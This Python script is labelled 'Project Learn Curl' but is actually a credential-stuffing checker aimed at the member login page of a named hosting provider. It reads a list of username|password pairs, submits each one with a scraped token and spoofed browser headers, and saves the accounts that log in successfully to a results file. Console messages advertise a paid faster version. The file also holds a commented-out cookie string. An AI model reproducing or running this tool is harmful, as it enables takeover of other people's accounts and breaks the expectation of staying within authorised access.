#Python3
#Project Learn Curl
#Copyright @RH Dyar AP 2022
import requests,bs4
import sys,os
from time import sleep
try:
    os.system("pip install requests")
    os.system("pip install bs4")
    os.system("pip install sys")
    os.system("pip install os")
    os.system("pip install time")
except:
    pass    
CLEAR_SCREEN = "\033[2J"
RED = "\033[1;31m"
BLUE  = "\033[34m"
YELLOW = "\033[1;33m"
CYAN  = "\033[36m"
GREEN = "\033[1;32m"
RESET = "\033[0m"
BOLD    = "\033[m"
WHITE = "\033[1;37m"
H = 0
def bacot(text):
  for letter in text:
    print(letter, end="")
    sys.stdout.flush()
    sleep(0.05) 

def cek():
    global H
    x = requests.get('https://member.jagoanhosting.com/login')
    b = bs4.BeautifulSoup(x.text, 'html.parser')
    tok = b.find('input', {'name':"token"}).get("value")
    d = input(f"{WHITE}List > {RESET}")
    kuntul = open(d, 'r+',  encoding="utf-8").read().splitlines()

    for list in kuntul:
        pisah = list.strip()
        empas = pisah.split('|')

        usr = empas[0]
        pas = empas[1]
        account = usr+'|'+pas
        c = requests.get('https://member.jagoanhosting.com/login')
        headers = {
            'authority': 'member.jagoanhosting.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            # Requests sorts cookies= alphabetically
            # 'cookie': '_gcl_au=1.1.126936995.1666853612; _fbp=fb.1.1666853612475.1788336540; _gid=GA1.2.812658142.1666853612; _hjFirstSeen=1; _hjSession_793180=eyJpZCI6IjQ4MWU2MGZhLTAyNjYtNDA0OS04OTNlLTc5MjkzYTMzOTc2OSIsImNyZWF0ZWQiOjE2NjY4NTM2MTI2MDksImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; _ga_YYQ4WX137P=GS1.1.1666853612.1.1.1666853614.58.0.0; _hjSessionUser_793180=eyJpZCI6ImYyNDJlYWZmLTQ3NzQtNWI0Ny1iYTMwLWFmY2VkNjcwOTJiZCIsImNyZWF0ZWQiOjE2NjY4NTM2MTI1NjcsImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInPageviewSample=1; _hjIncludedInSessionSample=1; popup-60=%7B%22notShowAgain%22%3A0%2C%22lastTriggered%22%3A1666853984643%7D; WHMCSvLu9c8MtJ9yS=29ve9avck00lr1v1h8aadn6mr4; _ga=GA1.1.1380988530.1666853612; _ga_XLTX0RXV58=GS1.1.1666853615.1.1.1666854200.60.0.0',
            'origin': 'https://member.jagoanhosting.com',
            'pragma': 'no-cache',
            'referer': 'https://member.jagoanhosting.com/login',
            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        }

        data = {
            'token': tok,
            'username': usr,
            'password': pas,
            'rememberme': 'on',
        }

        response = requests.post('https://member.jagoanhosting.com/login', cookies=c.cookies, headers=headers, data=data)
        H += 1
        if 'Login Details Incorrect. Please try again' in response.text:
            print(f'[{H}]{account}{RED} =>salah {YELLOW}./JGHostRHD{RESET}')
        else:
            print(f'[{H}]{account}{GREEN} =>benar {YELLOW}./JGHostRHD{RESET}') 
            open('Result.txt', "a+").write(account+'\n')
            
try:            
    os.system("cls")    
    bacot(YELLOW+"CHECKER JAGOANHOSTING \n"+RESET)
    bacot(CYAN+"        Koleksibot"+RESET)
    print('')
    cek()
    print(BOLD+'Proses Done ! check your result in file Result.txt')
except KeyboardInterrupt:
    print(f"{RED}\nSTOPED")  
    print(f"{RED}MAU CEPET?{RESET}")  
    print(f"{RED}BAYAR GOBLOOK{RESET}") 
    print(f"{GREEN}PM on instgram {YELLOW}@rhdyar{RESET}")    
